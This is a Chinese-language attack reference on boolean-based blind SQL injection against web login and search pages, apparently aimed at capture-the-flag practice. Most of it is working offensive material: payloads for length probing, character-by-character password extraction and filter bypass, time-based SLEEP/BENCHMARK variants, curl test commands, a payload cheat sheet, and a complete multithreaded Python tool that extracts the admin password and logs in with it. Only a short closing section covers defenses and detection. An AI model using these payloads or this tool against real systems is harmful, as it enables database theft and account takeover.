# SQL注入 - 布尔盲注技术攻击库

## 概述

布尔盲注是一种SQL注入技术,当应用程序不直接返回查询结果,只返回真/假两种状态时使用。攻击者通过构造条件语句,根据页面响应差异逐字符提取数据库信息。这种技术常用于搜索、验证等只返回存在/不存在的功能点。

**核心威胁**: 过滤不完整 → 布尔条件构造 → 响应差异分析 → 逐字符提取数据

## 布尔盲注原理

### 响应差异

```php
// 正常查询
SELECT * FROM users WHERE username = "admin"
// 返回: "User exists: admin"

// True条件
SELECT * FROM users WHERE username = "admin" OR 1=1 -- "
// 返回: "User exists: admin" (多个用户)

// False条件  
SELECT * FROM users WHERE username = "admin" AND 1=2 -- "
// 返回: "User not found"
```

### 二分法提取

```python
# 获取密码第1个字符的ASCII值
# ASCII值在32-126之间

# 测试 > 64
if response_true: low = 64
else: high = 64

# 测试 > 96
# ...最终确定字符
```

## 核心攻击技术

### 1. 长度探测

**技术**: 使用`LENGTH()`函数获取字段长度

```sql
-- 测试密码长度
admin" OR LENGTH(password)=10 #
admin" OR LENGTH(password)>10 #
admin" OR LENGTH(password)<10 #

-- 绕过空格过滤
admin"OR(LENGTH(password)=10)#
admin"OR/**/LENGTH(password)=10#
```

**应用场景**:
- 确定提取数据的长度
- 优化后续字符提取
- 减少请求次数

### 2. 逐字符提取

**技术**: 使用`SUBSTRING()`/`MID()`结合`ASCII()`提取

```sql
-- 提取第1个字符
admin" OR ASCII(SUBSTRING(password,1,1))=97 #  -- 'a'
admin" OR ASCII(MID(password,1,1))>90 #

-- 绕过substring过滤,使用mid()
admin" OR ASCII(MID(password,1,1))=97 #

-- 绕过空格过滤
admin"OR(ASCII(MID(password,1,1))=97)#
```

**字符提取流程**:
```python
for position in range(1, length+1):
    for ascii_val in range(32, 127):
        payload = f'admin"OR(ASCII(MID(password,{position},1))={ascii_val})#'
        if test_true(payload):
            password += chr(ascii_val)
            break
```

### 3. 二分法优化

**技术**: 使用二分法减少请求次数

```python
def binary_search_char(position):
    low = 32   # 最小ASCII
    high = 126 # 最大ASCII
    
    while low < high:
        mid = (low + high) // 2
        payload = f'admin"OR(ASCII(MID(password,{position},1))>{mid})#'
        
        if test_true(payload):
            low = mid + 1
        else:
            high = mid
    
    return chr(low)
```

**优势**:
- 从128次减少到7次(log2(128))
- 大幅提高效率

### 4. 关键字绕过

**技术**: 绕过常见的关键字过滤

```sql
-- 过滤了空格
admin"OR(1=1)#
admin"OR/**/1=1#
admin"OR%091=1#  -- Tab

-- 过滤了AND
admin"OR(1)OR(1)#
admin"||1||#

-- 过滤了substring
admin"OR(MID(password,1,1)='a')#
admin"OR(LEFT(password,1)='a')#
admin"OR(RIGHT(password,1)='a')#

-- 过滤了WHERE (通常不需要)
-- 注入点本身在WHERE子句中

-- 过滤了LIKE
admin"OR(password='test')#
admin"OR(password/**/REGEXP/**/'.*')#
```

### 5. 条件语句利用

**技术**: 使用IF/CASE进行条件判断

```sql
-- 使用IF
admin" OR IF(MID(password,1,1)='a',1,0) #

-- 使用CASE
admin" OR CASE WHEN MID(password,1,1)='a' THEN 1 ELSE 0 END #

-- 绕过空格
admin"OR(IF(MID(password,1,1)='a',1,0))#
admin"OR(CASE/**/WHEN(MID(password,1,1)='a')THEN(1)ELSE(0)END)#
```

### 6. 时间盲注备选

**技术**: 当布尔差异不明显时,使用时间延迟

```sql
-- 使用SLEEP
admin" OR IF(MID(password,1,1)='a',SLEEP(3),0) #

-- 使用BENCHMARK
admin" OR IF(MID(password,1,1)='a',BENCHMARK(10000000,MD5('a')),0) #
```

## 完整攻击工具

### 布尔盲注自动化工具

```python
#!/usr/bin/env python3
"""
SQL布尔盲注自动化利用工具
支持关键字绕过、二分法优化
"""

import requests
import string
import sys
from concurrent.futures import ThreadPoolExecutor

class BooleanBlindSQLi:
    def __init__(self, target_url, param='username'):
        self.target = target_url.rstrip('/')
        self.param = param
        self.session = requests.Session()
        self.charset = string.ascii_letters + string.digits + string.punctuation
        
    def test_injection(self, payload):
        """
        测试SQL注入payload是否返回True
        
        Args:
            payload: 注入载荷
        
        Returns:
            bool: 条件是否为真
        """
        try:
            params = {self.param: payload}
            r = self.session.get(self.target, params=params, timeout=10)
            
            # 根据响应判断True/False
            # 需要根据实际应用调整判断逻辑
            if "User exists" in r.text or "found" in r.text.lower():
                return True
            elif "not found" in r.text.lower() or "does not exist" in r.text.lower():
                return False
            else:
                # 通过响应长度判断
                return len(r.text) > 1000
                
        except Exception as e:
            print(f"[-] 请求错误: {e}")
            return False
    
    def detect_injection(self):
        """
        检测SQL注入漏洞
        
        Returns:
            bool: 是否存在注入
        """
        print("[*] 检测SQL注入...")
        
        payloads = [
            ('admin"OR"1"="1', True),   # 永真
            ('admin"OR"1"="2', False),  # 永假
            ('admin"OR(1=1)#', True),
            ('admin"OR(1=2)#', False),
        ]
        
        for payload, expected in payloads:
            result = self.test_injection(payload)
            print(f"[*] 测试: {payload[:30]} → {result}")
            
            if result == expected:
                print(f"[+] SQL注入确认! Payload: {payload}")
                return True
        
        print("[-] 未检测到SQL注入")
        return False
    
    def get_data_length(self, table, column, where="1=1", username="admin"):
        """
        获取数据长度
        
        Args:
            table: 表名
            column: 列名
            where: WHERE条件
            username: 用户名
        
        Returns:
            int: 数据长度
        """
        print(f"[*] 获取{column}长度...")
        
        # 二分法查找长度
        low = 0
        high = 100
        
        while low < high:
            mid = (low + high + 1) // 2
            payload = f'{username}"OR(LENGTH((SELECT/**/{column}/**/FROM/**/{table}/**/WHERE/**/{where}/**/LIMIT/**/1))>{mid-1})#'
            
            # 尝试绕过过滤的版本
            if 'filtered' in self.session.get(self.target, params={self.param: payload}).text:
                # 使用简化版本
                payload = f'{username}"OR(LENGTH({column})>{mid-1})#'
            
            if self.test_injection(payload):
                low = mid
            else:
                high = mid - 1
        
        print(f"[+] {column}长度: {low}")
        return low
    
    def extract_char_binary(self, position, field="password", username="admin"):
        """
        使用二分法提取单个字符
        
        Args:
            position: 字符位置
            field: 字段名
            username: 用户名
        
        Returns:
            str: 提取的字符
        """
        low = 32
        high = 126
        
        while low < high:
            mid = (low + high + 1) // 2
            
            # 构造payload,尝试多种绕过方式
            payloads = [
                f'{username}"OR(ASCII(MID({field},{position},1))>{mid-1})#',
                f'{username}"OR(ASCII(SUBSTRING({field},{position},1))>{mid-1})#',
                f'{username}"OR/**/ASCII(MID({field},{position},1))>{mid-1}#',
            ]
            
            for payload in payloads:
                try:
                    if self.test_injection(payload):
                        low = mid
                        break
                    else:
                        high = mid - 1
                        break
                except:
                    continue
        
        return chr(low)
    
    def extract_data(self, field="password", length=None, username="admin"):
        """
        提取完整数据
        
        Args:
            field: 字段名
            length: 数据长度
            username: 用户名
        
        Returns:
            str: 提取的数据
        """
        if length is None:
            length = self.get_data_length("users", field, f"username='{username}'", username)
        
        if length == 0:
            print("[-] 长度为0,无法提取")
            return ""
        
        print(f"[*] 开始提取{field}...")
        data = ""
        
        for position in range(1, length + 1):
            char = self.extract_char_binary(position, field, username)
            data += char
            print(f"\r[+] {field}: {data}", end="", flush=True)
        
        print()
        return data
    
    def extract_data_parallel(self, field="password", length=None, username="admin", workers=5):
        """
        并行提取数据(多线程)
        
        Args:
            field: 字段名
            length: 数据长度
            username: 用户名
            workers: 线程数
        
        Returns:
            str: 提取的数据
        """
        if length is None:
            length = self.get_data_length("users", field, f"username='{username}'", username)
        
        print(f"[*] 使用{workers}线程并行提取...")
        
        chars = [None] * length
        
        def extract_position(pos):
            chars[pos-1] = self.extract_char_binary(pos, field, username)
            print(f"[+] 位置{pos}: {chars[pos-1]}")
        
        with ThreadPoolExecutor(max_workers=workers) as executor:
            executor.map(extract_position, range(1, length + 1))
        
        data = ''.join(chars)
        print(f"[+] {field}: {data}")
        return data
    
    def full_exploit(self, username="admin"):
        """
        完整利用流程
        
        Args:
            username: 目标用户名
        """
        print("=" * 60)
        print("[*] SQL布尔盲注完整利用")
        print("=" * 60)
        
        # 1. 检测注入
        if not self.detect_injection():
            return False
        
        print()
        
        # 2. 提取密码
        print(f"[*] 目标用户: {username}")
        password = self.extract_data("password", username=username)
        
        if password:
            print(f"\n[+] 成功提取密码: {password}")
            
            # 3. 尝试登录
            print("\n[*] 尝试登录...")
            login_url = self.target.replace('/search.php', '/login.php')
            
            r = self.session.post(login_url, data={
                'username': username,
                'password': password
            })
            
            if 'flag' in r.text.lower():
                import re
                flag = re.search(r'flag\{[^}]+\}', r.text, re.I)
                if flag:
                    print(f"[+] FLAG: {flag.group()}")
                    return True
        
        return False

def exploit_boolean_blind_sqli(target_url, username='admin'):
    """
    布尔盲注利用入口
    
    Args:
        target_url: 目标URL
        username: 用户名
    """
    print(f"[*] 目标: {target_url}")
    print(f"[*] 用户: {username}")
    print()
    
    exploiter = BooleanBlindSQLi(target_url)
    success = exploiter.full_exploit(username)
    
    if success:
        print("\n[+] 攻击成功!")
    else:
        print("\n[-] 攻击未成功")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法:")
        print(f"  {sys.argv[0]} <target_url> [username]")
        print()
        print("示例:")
        print(f"  {sys.argv[0]} http://target/search.php")
        print(f"  {sys.argv[0]} http://target/search.php admin")
        sys.exit(1)
    
    target = sys.argv[1]
    username = sys.argv[2] if len(sys.argv) > 2 else 'admin'
    
    exploit_boolean_blind_sqli(target, username)
```

## 实战场景

### 场景1: 用户搜索功能盲注

**易受攻击代码**:
```php
$sql = "SELECT * FROM users WHERE username='". filter_chars($_GET['username']) ."'";
$result = $conn->query($sql);

if ($result->num_rows > 0) {
    echo "User exists";
} else {
    echo "User not found";
}
```

**利用**:
```python
import requests

# 1. 测试注入
r = requests.get('http://target/search.php?username=admin"OR"1"="1')
# 返回"User exists"

# 2. 获取密码长度
for i in range(1, 50):
    r = requests.get(f'http://target/search.php?username=admin"OR(LENGTH(password)={i})#')
    if 'exists' in r.text:
        print(f"密码长度: {i}")
        break

# 3. 逐字符提取
password = ""
for pos in range(1, length+1):
    for c in range(32, 127):
        r = requests.get(f'http://target/search.php?username=admin"OR(ASCII(MID(password,{pos},1))={c})#')
        if 'exists' in r.text:
            password += chr(c)
            print(f"密码: {password}")
            break
```

### 场景2: 登录验证盲注

```bash
# 测试用户存在
curl "http://target/check_user.php?user=admin"
# 返回: true

# 提取密码
curl "http://target/check_user.php?user=admin\"OR(MID(password,1,1)='a')#"
```

### 场景3: API参数盲注

```python
# API返回JSON
r = requests.get('http://target/api/user?id=1"OR(1=1)#')
# {"exists": true}

r = requests.get('http://target/api/user?id=1"OR(1=2)#')  
# {"exists": false}
```

## 手动测试命令

### 基本盲注测试

```bash
# 1. 测试永真条件
curl "http://target/search.php?username=admin\"OR\"1\"=\"1"

# 2. 测试永假条件
curl "http://target/search.php?username=admin\"OR\"1\"=\"2"

# 3. 测试长度
curl "http://target/search.php?username=admin\"OR(LENGTH(password)=10)#"

# 4. 测试第1个字符
curl "http://target/search.php?username=admin\"OR(ASCII(MID(password,1,1))=97)#"
```

### 绕过过滤测试

```bash
# 绕过空格
curl "http://target/search.php?username=admin\"OR(1=1)#"
curl "http://target/search.php?username=admin\"OR/**/1=1#"

# 绕过substring
curl "http://target/search.php?username=admin\"OR(MID(password,1,1)='a')#"

# 绕过AND
curl "http://target/search.php?username=admin\"OR(1)OR(1)#"
```

## Payload速查表

### 基本测试
```sql
admin" OR "1"="1
admin" OR 1=1 #
admin" OR (1=1)#
admin" OR '1'='1
```

### 长度探测
```sql
admin" OR LENGTH(password)=10 #
admin" OR LENGTH(password)>10 #
admin" OR (LENGTH(password)=10)#
```

### 字符提取
```sql
admin" OR ASCII(MID(password,1,1))=97 #
admin" OR ASCII(SUBSTRING(password,1,1))>90 #
admin" OR MID(password,1,1)='a' #
admin" OR LEFT(password,1)='a' #
```

### 绕过技巧
```sql
-- 绕过空格
admin"OR(1=1)#
admin"OR/**/1=1#
admin"OR%091=1#

-- 绕过关键字
admin"OR(MID(password,1,1)='a')#  -- 代替substring
admin"||1||#  -- 代替OR
admin"OR(CASE/**/WHEN(1)THEN(1)END)#  -- 代替IF
```

## 防御措施

### 1. 使用参数化查询

```php
// 正确
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
```

### 2. 严格的输入验证

```php
// 白名单验证
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
    die("Invalid username");
}
```

### 3. 最小权限原则

```sql
-- 数据库用户只有SELECT权限
GRANT SELECT ON database.users TO 'webapp'@'localhost';
```

### 4. 错误信息隐藏

```php
// 不要暴露数据库错误
try {
    $result = $conn->query($sql);
} catch (Exception $e) {
    error_log($e->getMessage());
    die("An error occurred");
}
```

## 检测特征

1. **大量相似请求**: 逐字符提取导致大量请求
2. **响应时间规律**: 二分法导致固定次数请求
3. **SQL函数特征**: LENGTH、MID、ASCII等
4. **条件语句**: OR、IF、CASE等

## 优化技巧

### 1. 二分法

```python
# 从128次减少到7次
def binary_search(low=32, high=126):
    while low < high:
        mid = (low + high + 1) // 2
        if test(f'ASCII(MID(pwd,{pos},1))>{mid-1}'):
            low = mid
        else:
            high = mid - 1
    return low
```

### 2. 多线程并行

```python
from concurrent.futures import ThreadPoolExecutor

with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(extract_char, i) for i in range(1, length+1)]
    chars = [f.result() for f in futures]
```

### 3. 缓存常见字符

```python
# 先测试常见字符
common_chars = 'aeiou0123456789'
for char in common_chars:
    if test(f"MID(pwd,{pos},1)='{char}'"):
        return char
# 失败后再用二分法
```

## 总结

SQL布尔盲注是一种强大但耗时的注入技术,主要利用点:
- 应用只返回True/False两种状态
- 通过构造条件语句判断数据
- 逐字符或二分法提取信息

**关键攻击路径**: 检测注入 → 探测长度 → 二分法提取字符 → 拼接完整数据 → 登录/获取FLAG

**效率优化**: 二分法(7次) + 多线程 + 常见字符优先,可将提取速度提升10倍以上。
